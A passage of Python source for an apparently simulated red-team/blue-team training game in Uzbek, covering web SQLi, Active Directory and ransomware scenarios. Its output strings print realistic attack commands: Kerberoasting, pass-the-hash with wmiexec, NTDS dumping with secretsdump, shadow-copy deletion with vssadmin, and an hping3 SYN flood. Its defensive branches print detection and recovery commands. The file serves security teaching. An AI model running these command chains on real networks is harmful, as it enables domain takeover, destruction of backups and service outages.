                            {'type': 'info', 'text': "[*] Filtrni aylanib o'tish uchun 'waf bypass' qiling."},
                        ]
                    }

            elif action == 'exploit':
                if not red['scanned'] or not red['token_acquired']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Qadam buzildi: scan → recon ketma-ketligini bajaring."}]}
                if not red['waf_bypassed']:
                    alert = add_threat(state, 40, 'MODSEC-942140', 'Direct Union SQLi Blocked', "WAF ni aylanib o'tmasdan exploit yuborildi.", 'T1190')
                    if state.get('is_blocked') or state.get('threat', 0) >= 80:
                        state['is_blocked'] = True
                        state['block_reason'] = "WAF ni aylanib o'tmasdan to'g'ridan-to'g'ri exploit yuborilgani uchun SOC IP ni to'sdi!"
                        state['forensic_report'] = generate_forensic_report(state)
                        return {'ok': False, 'blocked': True, 'attack': 'counter_block', 'focus': 'attacker', 'lines': [{'type': 'danger', 'text': f"[-] {state['block_reason']}"}]}
                    return {'ok': False, 'attack': 'waf_block', 'focus': 'waf', 'lines': [{'type': 'danger', 'text': "[-] WAF so'rovni to'xtatdi (HTTP 403 Forbidden). Avval 'waf bypass' qiling!"}]}

                red['exploited'] = True
                log_mitre(state, 'T1059')
                log_mitre(state, 'T1005')
                flag_val = get_dynamic_lab_flag(request, 'red', 'web', CHALLENGE_ID)
                red['flag'] = flag_val
                state['forensic_report'] = generate_forensic_report(state)
                return {
                    'ok': True,
                    'attack': 'exploit',
                    'focus': 'db',
                    'camera': 'db',
                    'lines': [
                        {'type': 'cmd', 'text': f"operator@kali:~$ exploit --token {red['token_val']} --payload bypass"},
                        {'type': 'success', 'text': "[+] Baza himoyasi buzildi: 'vault' jadvaliga kirish muvaffaqiyatli!"},
                        {'type': 'success', 'text': "=================================================="},
                        {'type': 'success', 'text': f"SIZNING SHAXSIY FLAGGINGIZ: {flag_val}"},
                        {'type': 'success', 'text': "=================================================="},
                        {'type': 'info', 'text': "[*] Ekspertiza hisobotini ko'rish uchun 'report' deb yozing."},
                    ]
                }

        # ---------- 2. ACTIVE DIRECTORY SSENARIYSI ----------
        elif scenario == 'ad':
            if action in ('scan', 'net', 'nmap'):
                red['scanned'] = True
                log_mitre(state, 'T1018')
                add_threat(state, 15, 'SURICATA-2010992', 'ET SCAN Active Directory LDAP/SMB Probe', "172.16.10.0/24 tarmog'idagi domen xizmatlari skanerlandi.", 'T1018')
                return {
                    'ok': True,
                    'attack': 'scan',
                    'focus': 'web',
                    'lines': [
                        {'type': 'cmd', 'text': "operator@kali:~$ net view /domain:CORP.LOCAL && nmap -p 88,389,445 172.16.10.0/24"},
                        {'type': 'success', 'text': "[+] Domen topildi: CORP.LOCAL"},
                        {'type': 'info', 'text': "    172.16.10.5   WIN-DC01       (Domain Controller · Kerberos, LDAP, SMB)"},
                        {'type': 'info', 'text': "    172.16.10.15  WKSTN-FIN01    (Zararlangan moliya kompyuteri · SMBv2)"},
                        {'type': 'info', 'text': "    172.16.10.50  BACKUP-DC      (Zaxira nusxalar ombori)"},
                        {'type': 'warn', 'text': "[*] Keyingi qadam: Domen ob'ektlarini xaritalash uchun 'bloodhound' deb yozing."},
                    ]
                }

            elif action in ('bloodhound', 'recon'):
                if not red['scanned']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval domen tarmog'ini skanerlang: 'scan ad'."}]}
                red['token_acquired'] = True
                log_mitre(state, 'T1087')
                add_threat(state, 15, 'SYSMON-EVENT-7', 'BloodHound Sharphound Ingest Activity', "LDAP orqali barcha SPN va ACL zanjirlari so'raldi.", 'T1087')
                return {
                    'ok': True,
                    'focus': 'waf',
                    'lines': [
                        {'type': 'cmd', 'text': "operator@kali:~$ bloodhound-python -u 'fin_user' -p 'P@ss123' -d CORP.LOCAL -dc WIN-DC01 -c All"},
                        {'type': 'success', 'text': "[+] Domen xaritasi tuzildi: Qisqa yo'l topildi!"},
                        {'type': 'info', 'text': "    Zaif xizmat hisobi: 'svc_sql' (SPN: MSSQLSvc/db.corp.local)"},
                        {'type': 'warn', 'text': "[*] Keyingi qadam: TGS chiptasini so'rab Kerberoast qilish uchun 'kerberoast' deb yozing."},
                    ]
                }

            elif action == 'kerberoast':
                if not red['token_acquired']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval SPN hisoblarini aniqlang: 'bloodhound'."}]}
                red['waf_tested'] = True
                log_mitre(state, 'T1558.003')
                add_threat(state, 25, 'WIN-EVENT-4769', 'A Kerberos Service Ticket Was Requested (RC4-HMAC)', "Shubhali TGS so'rovi qayd etildi.", 'T1558.003')
                return {
                    'ok': True,
                    'attack': 'waf_block',
                    'focus': 'waf',
                    'lines': [
                        {'type': 'cmd', 'text': "operator@kali:~$ GetUserSPNs.py CORP.LOCAL/fin_user:P@ss123 -request -outputfile hashes.kerberoast"},
                        {'type': 'success', 'text': "[+] TGS Chiptasi olindi: $krb5tgs$23$*svc_sql*CORP.LOCAL*..."},
                        {'type': 'info', 'text': "[*] Hashcat (Mode 13100) orqali parolni ochish..."},
                        {'type': 'success', 'text': "[+] Xizmat paroli buzildi: svc_sql : 'Winter2026!' [NTLM: 7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D]"},
                        {'type': 'warn', 'text': "[*] Endi DC ga NTLM hash orqali harakatlanish uchun 'pass-the-hash' deb yozing."},
                    ]
                }

            elif action in ('pass-the-hash', 'pth'):
                if not red['waf_tested']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval Kerberoasting qiling: 'kerberoast'."}]}
                red['waf_bypassed'] = True
                log_mitre(state, 'T1550.002')
                add_threat(state, 10, 'SECURITY-AUDIT-4624', 'Successful Logon with NTLM Alternate Credentials', "NTLM orqali WIN-DC01 ga sessiya ochildi.", 'T1550.002')
                return {
                    'ok': True,
                    'focus': 'web',
                    'lines': [
                        {'type': 'cmd', 'text': "operator@kali:~$ wmiexec.py -hashes :7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D CORP.LOCAL/svc_sql@172.16.10.5"},
                        {'type': 'success', 'text': "[+] WIN-DC01 (172.16.10.5) ga WMI masofaviy qobiq ochildi! (MITRE T1550.002)"},
                        {'type': 'info', 'text': "    C:\\Windows\\system32> whoami -> corp\\svc_sql (Privilege: SeImpersonatePrivilege)"},
                        {'type': 'warn', 'text': "[*] Domen Administratori huquqini olish uchun 'domain-admin' deb yozing."},
                    ]
                }

            elif action in ('domain-admin', 'exploit'):
                if not red['waf_bypassed']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval DC ga harakatlaning: 'pass-the-hash'."}]}
                red['exploited'] = True
                log_mitre(state, 'T1078')
                log_mitre(state, 'T1005')
                flag_val = get_dynamic_lab_flag(request, 'red', 'ad', CHALLENGE_ID)
                red['flag'] = flag_val
                state['forensic_report'] = generate_forensic_report(state)
                return {
                    'ok': True,
                    'attack': 'exploit',
                    'focus': 'db',
                    'camera': 'db',
                    'lines': [
                        {'type': 'cmd', 'text': "operator@kali:~$ secretsdump.py -just-dc-ntds CORP.LOCAL/Administrator@172.16.10.5"},
                        {'type': 'success', 'text': "[+] DOMEN KONTROLLERI TO'LIQ QO'LGA OLINDI! NTDS.dit xavfsiz bazasi chiqarildi."},
                        {'type': 'success', 'text': "=================================================="},
                        {'type': 'success', 'text': f"SIZNING SHAXSIY AD FLAGGINGIZ: {flag_val}"},
                        {'type': 'success', 'text': "=================================================="},
                    ]
                }

        # ---------- 3. RANSOMWARE SSENARIYSI ----------
        else:
            if action in ('scan', 'probe'):
                red['scanned'] = True
                log_mitre(state, 'T1046')
                add_threat(state, 15, 'SURICATA-2019800', 'ET POLICY Inbound SMB/RPC Network Sweep', "Fayl ombori tarmoq skaneri.", 'T1046')
                return {
                    'ok': True,
                    'attack': 'scan',
                    'focus': 'web',
                    'lines': [
                        {'type': 'cmd', 'text': "operator@kali:~$ crackmapexec smb 192.168.40.0/24"},
                        {'type': 'success', 'text': "[+] Tarmoq omborlari aniqlandi:"},
                        {'type': 'info', 'text': "    192.168.40.10  SHARE-SRV01    (Asosiy korporativ SMB papkalar, VSS faol)"},
                        {'type': 'info', 'text': "    192.168.40.20  APP-CLUSTER    (Ilovalar serveri)"},
                        {'type': 'warn', 'text': "[*] Keyingi qadam: Kripto-payload ni yuklash uchun 'drop payload' deb yozing."},
                    ]
                }

            elif action in ('drop', 'payload'):
                if not red['scanned']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval tarmoqni o'rganing: 'scan'."}]}
                red['token_acquired'] = True
                log_mitre(state, 'T1105')
                add_threat(state, 15, 'EDR-ALERT-104', 'Suspicious Binary Dropped to %TEMP% (crypt_agent.exe)', "Shubhali fayl tushirildi.", 'T1105')
                return {
                    'ok': True,
                    'focus': 'waf',
                    'lines': [
                        {'type': 'cmd', 'text': "operator@kali:~$ smbclient //192.168.40.10/Shared -c 'put crypt_agent.exe'"},
                        {'type': 'success', 'text': "[+] 'crypt_agent.exe' yuklandi (MITRE T1105)."},
                        {'type': 'warn', 'text': "[*] Tiklash imkoniyatini yo'qotish uchun 'disable-vss' deb yozing."},
                    ]
                }

            elif action in ('disable-vss', 'vss'):
                if not red['token_acquired']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval payload ni yuklang: 'drop payload'."}]}
                red['waf_tested'] = True
                log_mitre(state, 'T1490')
                add_threat(state, 25, 'SURICATA-2024110', 'ET TROJAN Shadow Copy Deletion Command Detected', "vssadmin delete shadows ishga tushdi.", 'T1490')
                return {
                    'ok': True,
                    'focus': 'waf',
                    'lines': [
                        {'type': 'cmd', 'text': "operator@kali:~$ wmiexec.py SHARE-SRV01 'vssadmin delete shadows /all /quiet && wbadmin delete catalog -quiet'"},
                        {'type': 'danger', 'text': "[+] Barcha zaxira nusxalari (Shadow Copies) o'chirildi! (MITRE T1490)"},
                        {'type': 'warn', 'text': "[*] Papkalarni shifrlash uchun 'encrypt-shares' deb yozing."},
                    ]
                }

            elif action in ('encrypt-shares', 'encrypt'):
                if not red['waf_tested']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval VSS ni o'chiring: 'disable-vss'."}]}
                red['waf_bypassed'] = True
                log_mitre(state, 'T1486')
                add_threat(state, 25, 'EDR-ALERT-909', 'High Volume File Renaming with .LOCKED Extension', "Ommaviy shifrlash boshlandi.", 'T1486')
                return {
                    'ok': True,
                    'attack': 'exploit',
                    'focus': 'db',
                    'lines': [
                        {'type': 'cmd', 'text': "operator@kali:~$ wmiexec.py SHARE-SRV01 'C:\\Shared\\crypt_agent.exe --target \\\\SHARE-SRV01\\* --threads 16'"},
                        {'type': 'danger', 'text': "[+] 14,200 ta fayl AES-256 bilan shifrlanmoqda... Har bir fayl kengaytmasi: .LOCKED"},
                        {'type': 'warn', 'text': "[*] To'lov xatini qo'yish va flagni olish uchun 'ransom-note' deb yozing."},
                    ]
                }

            elif action in ('ransom-note', 'exploit'):
                if not red['waf_bypassed']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval fayllarni shifrlang: 'encrypt-shares'."}]}
                red['exploited'] = True
                log_mitre(state, 'T1041')
                flag_val = get_dynamic_lab_flag(request, 'red', 'ransomware', CHALLENGE_ID)
                red['flag'] = flag_val
                state['forensic_report'] = generate_forensic_report(state)
                return {
                    'ok': True,
                    'attack': 'exploit',
                    'focus': 'db',
                    'camera': 'db',
                    'lines': [
                        {'type': 'cmd', 'text': "operator@kali:~$ wmiexec.py SHARE-SRV01 'type C:\\Shared\\DECRYPT_FILES.txt'"},
                        {'type': 'danger', 'text': "[+] BARCHA FAYLLAR SHIFRLANDI! To'lov talabnomasi qoldirildi."},
                        {'type': 'success', 'text': "=================================================="},
                        {'type': 'success', 'text': f"SIZNING SHAXSIY RANSOMWARE FLAGGINGIZ: {flag_val}"},
                        {'type': 'success', 'text': "=================================================="},
                    ]
                }

        # DoS buyrug'i (umumiy Red Team)
        if action == 'ddos':
            log_mitre(state, 'T1498')
            alert = add_threat(state, 50, 'SURICATA-2002100', 'ET DOS High Volume SYN-Flood Attack', "Routerga soniyasiga 2000+ soxta SYN paketlar yog'ildi.", 'T1498')
            if state.get('is_blocked'):
                return {'ok': False, 'blocked': True, 'attack': 'counter_block', 'focus': 'attacker', 'lines': [{'type': 'danger', 'text': f"[-] {state['block_reason']}"}]}
            return {
                'ok': True,
                'attack': 'ddos',
                'focus': 'gateway',
                'lines': [
                    {'type': 'cmd', 'text': "operator@kali:~$ hping3 -S -p 80 --flood 10.0.8.1"},
                    {'type': 'danger', 'text': f"[!] SYN-flood boshlandi! (MITRE T1498) · Shubha: +50% (Jami: {state['threat']}%)"},
                ]
            }

    # ===================== BLUE TEAM (HIMOYA) BUYRUQLARI =====================
    else:
        blue = state['blue']

        # ---------- 1. WEB SSENARIYSI (BLUE) ----------
        if scenario == 'web':
            if action == 'soc' and arg1 == 'logs':
                blue['logs_viewed'] = True
                log_mitre(state, 'T1005_B')
                return {
                    'ok': True,
                    'lines': [
                        {'type': 'cmd', 'text': "defender@soc-center:~$ soc logs --tail 5"},
                        {'type': 'info', 'text': "=== SIEM XOM HODISALAR JURNALI (Audit Log) ==="},
                        {'type': 'danger', 'text': "  [ALERT] 198.51.100.42 -> POST /api/v1/search q=1' UNION SELECT (403 WAF)"},
                        {'type': 'warn', 'text': "[*] Keyingi qadam: Ushbu IP ni tahlil qiling: 'investigate 198.51.100.42'."},
                    ]
                }

            elif action == 'investigate':
                ip = arg1 or '198.51.100.42'
                log_mitre(state, 'T1082')
                blue['target_identified'] = True
                return {
                    'ok': True,
                    'focus': 'gateway',
                    'lines': [
                        {'type': 'cmd', 'text': f"defender@soc-center:~$ investigate {ip}"},
                        {'type': 'danger', 'text': f"[+] XAVF TASDIQLANDI: Tajovuzkor Botnet Tuguni ({ip})"},
                        {'type': 'info', 'text': "    Hujum turlari: SQL Injection urinishi + HTTP Tamper"},
                        {'type': 'warn', 'text': f"[*] Himoya chorasi: 'block {ip}' buyrug'i bilan IP ni to'sing."},
                    ]
                }

            elif action == 'block':
                ip = arg1 or '198.51.100.42'
                if not blue['target_identified']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval loglarni tahlil qiling: 'investigate 198.51.100.42'."}]}
                blue['ip_blocked'] = True
                log_mitre(state, 'T1562')
                return {
                    'ok': True,
                    'attack': 'mitigate',
                    'focus': 'waf',
                    'lines': [
                        {'type': 'cmd', 'text': f"defender@soc-center:~$ iptables -A INPUT -s {ip} -j DROP"},
                        {'type': 'success', 'text': f"[+] {ip} manzili firewall da to'liq bloklandi (MITRE T1562)."},
                        {'type': 'info', 'text': "[*] Endi veb-ilova zaifligini bartaraf eting: 'patch sql'."},
                    ]
                }

            elif action == 'patch' and (arg1 in ('sql', 'waf', '')):
                if not blue['ip_blocked']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval IP ni bloklang: 'block 198.51.100.42'."}]}
                blue['patched'] = True
                log_mitre(state, 'T1565')
                return {
                    'ok': True,
                    'focus': 'web',
                    'lines': [
                        {'type': 'cmd', 'text': "defender@soc-center:~$ waf apply-virtual-patch --cve CVE-SQLI-SEARCH"},
                        {'type': 'success', 'text': "[+] Veb-serverga Virtual Patch qo'yildi: /api/v1/search qat'iy tekshiruvga olindi."},
                        {'type': 'info', 'text': "[*] Tizim xavfsizligini tasdiqlash uchun 'verify' deb yozing."},
                    ]
                }

            elif action == 'verify':
                if not (blue['logs_viewed'] and blue['target_identified'] and blue['ip_blocked'] and blue['patched']):
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Barcha himoya qadamlari bajarilmagan. Ketma-ketlik: soc logs → investigate → block → patch sql."}]}
                blue['verified'] = True
                flag_val = get_dynamic_lab_flag(request, 'blue', 'web', CHALLENGE_ID)
                blue['flag'] = flag_val
                state['forensic_report'] = generate_forensic_report(state)
                return {
                    'ok': True,
                    'attack': 'mitigate',
                    'focus': 'defender',
                    'camera': 'defender',
                    'lines': [
                        {'type': 'cmd', 'text': "defender@soc-center:~$ verify-integrity"},
                        {'type': 'success', 'text': "[+] TARMOQ TO'LIQ HIMOYALANDI! Hujum bartaraf etildi."},
                        {'type': 'success', 'text': "=================================================="},
                        {'type': 'success', 'text': f"MOVIY JAMOA (BLUE TEAM) FLAGGINGIZ: {flag_val}"},
                        {'type': 'success', 'text': "=================================================="},
                    ]
                }

        # ---------- 2. ACTIVE DIRECTORY SSENARIYSI (BLUE) ----------
        elif scenario == 'ad':
            if action in ('soc', 'ad') and (arg1 in ('logs', 'status', '')):
                blue['logs_viewed'] = True
                log_mitre(state, 'T1005_B')
                return {
                    'ok': True,
                    'lines': [
                        {'type': 'cmd', 'text': "defender@ad-soc:~$ Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769} -MaxEvents 5"},
                        {'type': 'danger', 'text': "  [ANOMALY] Event ID 4769: A Kerberos Ticket was requested with RC4 encryption (0x17)!"},
                        {'type': 'info', 'text': "    Mijoz IP: 172.16.10.15 (Ishchi kompyuter: WKSTN-FIN01) · Nishon: svc_sql"},
                        {'type': 'warn', 'text': "[*] Keyingi qadam: Zararlangan kompyuterni tekshiring: 'investigate 172.16.10.15'."},
                    ]
                }

            elif action == 'investigate':
                ip = arg1 or '172.16.10.15'
                blue['target_identified'] = True
                log_mitre(state, 'T1082')
                return {
                    'ok': True,
                    'focus': 'waf',
                    'lines': [
                        {'type': 'cmd', 'text': f"defender@ad-soc:~$ Get-SysmonProcessAudit -ComputerName '{ip}'"},
                        {'type': 'danger', 'text': f"[+] XAVF TASDIQLANDI: '{ip}' da BloodHound va Mimikatz xotira inyeksiyasi aniqlandi!"},
                        {'type': 'warn', 'text': f"[*] Zudlik bilan kompyuterni tarmoqdan uzing: 'isolate-pc {ip}'."},
                    ]
                }

            elif action in ('isolate-pc', 'isolate'):
                ip = arg1 or '172.16.10.15'
                if not blue['target_identified']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval anomaliyani tahlil qiling: 'investigate 172.16.10.15'."}]}
                blue['ip_blocked'] = True
                log_mitre(state, 'T1562')
                return {
                    'ok': True,
                    'attack': 'mitigate',
                    'focus': 'waf',
                    'lines': [
                        {'type': 'cmd', 'text': f"defender@ad-soc:~$ Set-NetFirewallRule -DisplayName 'Quarantine-VLAN' -Target '{ip}' -Action Block"},
                        {'type': 'success', 'text': f"[+] {ip} kompyuteri korporativ tarmoqdan to'liq uzildi (Host Isolation)."},
                        {'type': 'info', 'text': "[*] Olingan chiptalarni bekor qilish uchun 'reset-krbtgt' deb yozing."},
                    ]
                }

            elif action in ('reset-krbtgt', 'reset-key'):
                if not blue['ip_blocked']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval zararlangan xostni uzing: 'isolate-pc 172.16.10.15'."}]}
                blue['patched'] = True
                log_mitre(state, 'T1565')
                return {
                    'ok': True,
                    'focus': 'web',
                    'lines': [
                        {'type': 'cmd', 'text': "defender@ad-soc:~$ Reset-KrbTgtPassword.ps1 -Mode DoubleReset -Force"},
                        {'type': 'success', 'text': "[+] KRBTGT hisob paroli 2 marta muvaffaqiyatli yangilandi. Barcha soxta Kerberos chiptalari bekor qilindi."},
                        {'type': 'info', 'text': "[*] Tizim butunligini tekshirish uchun 'verify' deb yozing."},
                    ]
                }

            elif action == 'verify':
                if not (blue['logs_viewed'] and blue['target_identified'] and blue['ip_blocked'] and blue['patched']):
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Barcha qadamlar bajarilmagan: ad logs → investigate → isolate-pc → reset-krbtgt."}]}
                blue['verified'] = True
                flag_val = get_dynamic_lab_flag(request, 'blue', 'ad', CHALLENGE_ID)
                blue['flag'] = flag_val
                state['forensic_report'] = generate_forensic_report(state)
                return {
                    'ok': True,
                    'attack': 'mitigate',
                    'focus': 'defender',
                    'camera': 'defender',
                    'lines': [
                        {'type': 'cmd', 'text': "defender@ad-soc:~$ Test-DomainControllerHealth -All"},
                        {'type': 'success', 'text': "[+] ACTIVE DIRECTORY DOMENI TO'LIQ HIMOYALANDI!"},
                        {'type': 'success', 'text': "=================================================="},
                        {'type': 'success', 'text': f"MOVIY JAMOA (BLUE TEAM) AD FLAGGINGIZ: {flag_val}"},
                        {'type': 'success', 'text': "=================================================="},
                    ]
                }

        # ---------- 3. RANSOMWARE SSENARIYSI (BLUE) ----------
        else:
            if action in ('soc', 'hunt-beacon', 'hunt'):
                blue['logs_viewed'] = True
                log_mitre(state, 'T1005_B')
                return {
                    'ok': True,
                    'lines': [
                        {'type': 'cmd', 'text': "defender@dfir-center:~$ zeek-cut id.orig_h id.resp_h < conn.log | grep -E '4444|8443'"},
                        {'type': 'danger', 'text': "  [CRIT] Tashqi C2 (192.168.40.100) bilan yashirin TLS beaconing oqimi aniqlandi!"},
                        {'type': 'info', 'text': "    Zararli jarayon: 'crypt_agent.exe' (PID: 4892) SHARE-SRV01 da ishga tushgan."},
                        {'type': 'warn', 'text': "[*] Jarayonni favqulodda to'xtatish uchun 'kill-process crypt_agent.exe' deb yozing."},
                    ]
                }

            elif action in ('kill-process', 'kill'):
                proc = arg1 or 'crypt_agent.exe'
                blue['target_identified'] = True
                log_mitre(state, 'T1562')
                return {
                    'ok': True,
                    'focus': 'waf',
                    'lines': [
                        {'type': 'cmd', 'text': f"defender@dfir-center:~$ pkill -9 -f '{proc}' && taskkill /F /IM '{proc}' /T"},
                        {'type': 'success', 'text': f"[+] {proc} barcha serverlarda majburiy to'xtatildi (MITRE T1562). Shifrlash to'xtadi!"},
                        {'type': 'warn', 'text': "[*] Zaxira nusxalarini tiklash uchun 'vss-restore' deb yozing."},
                    ]
                }

            elif action in ('vss-restore', 'restore'):
                if not blue['target_identified']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval zararli jarayonni o'ldiring: 'kill-process crypt_agent.exe'."}]}
                blue['ip_blocked'] = True
                log_mitre(state, 'T1490')
                return {
                    'ok': True,
                    'focus': 'web',
                    'lines': [
                        {'type': 'cmd', 'text': "defender@dfir-center:~$ wbadmin start systemstaterecovery -version:LatestClean -quiet"},
                        {'type': 'success', 'text': "[+] Hujumdan xoli bo'lgan so'nggi xavfsiz snapshot tiklandi (MITRE T1490)."},
                        {'type': 'info', 'text': "[*] Xotiradan shifrlash kalitini sug'urib olish uchun 'extract-key' deb yozing."},
                    ]
                }

            elif action in ('extract-key', 'extract'):
                if not blue['ip_blocked']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval zaxiradan tiklang: 'vss-restore'."}]}
                blue['patched'] = True
                log_mitre(state, 'T1005')
                return {
                    'ok': True,
                    'focus': 'db',
                    'lines': [
                        {'type': 'cmd', 'text': "defender@dfir-center:~$ volatility -f memory.dmp --profile=Win10x64 cryptoscan"},
                        {'type': 'success', 'text': "[+] Xotira dumpidan RSA xususiy kaliti topildi: [0x4F...B8] (MITRE T1005)"},
                        {'type': 'info', 'text': "[*] Qolgan barcha fayllarni qaytarish va tasdiqlash uchun 'verify' deb yozing."},
                    ]
                }

            elif action == 'verify':
                if not (blue['logs_viewed'] and blue['target_identified'] and blue['ip_blocked'] and blue['patched']):
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Barcha qadamlar bajarilmagan: hunt-beacon → kill-process → vss-restore → extract-key."}]}
                blue['verified'] = True
                flag_val = get_dynamic_lab_flag(request, 'blue', 'ransomware', CHALLENGE_ID)
                blue['flag'] = flag_val
                state['forensic_report'] = generate_forensic_report(state)
                return {
                    'ok': True,
                    'attack': 'mitigate',
                    'focus': 'defender',
                    'camera': 'defender',
                    'lines': [
                        {'type': 'cmd', 'text': "defender@dfir-center:~$ decryptor.exe --key-file recovered_rsa.key --scan-all"},
                        {'type': 'success', 'text': "[+] BARCHA FAYLLAR MUVAFFAQIYATLI TIKLANDI! RANSOMWARE HUJUMI BARTARAF ETILDI."},
                        {'type': 'success', 'text': "=================================================="},
                        {'type': 'success', 'text': f"MOVIY JAMOA (BLUE TEAM) RANSOMWARE FLAGGINGIZ: {flag_val}"},
                        {'type': 'success', 'text': "=================================================="},
                    ]
                }

    return {
        'ok': True,
        'lines': [{'type': 'danger', 'text': f"Noma'lum buyruq: '{text}'. Mavjud buyruqlar uchun 'help' deb yozing."}]
    }
